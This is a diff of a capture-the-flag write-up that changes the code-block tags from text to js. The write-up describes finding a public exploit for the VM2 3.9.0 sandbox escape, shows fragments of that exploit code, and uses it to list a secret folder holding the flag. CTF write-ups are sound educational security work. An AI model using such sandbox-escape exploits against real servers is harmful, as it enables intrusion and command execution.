@@ -6,7 +6,7 @@ We also have the server source code and `package-lock.json`, but we don't really
 
 Searching the web for `VM2 3.9.0 exploit` we can immediately find [this](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c) and we get the exploit..
 
-```text
+```js
 aVM2_INTERNAL_TMPNAME = {};
 function stack() {
     new Error().stack;
@@ -28,7 +28,7 @@ node_modules package-lock.json package.json s3cr3tf01d3r server.js views
 
 Then running `ls s3cr3tf01d3r` we see that it has the flag, and finally
 
-```text
+```js
 aVM2_INTERNAL_TMPNAME = {};
 function stack() {
     new Error().stack;
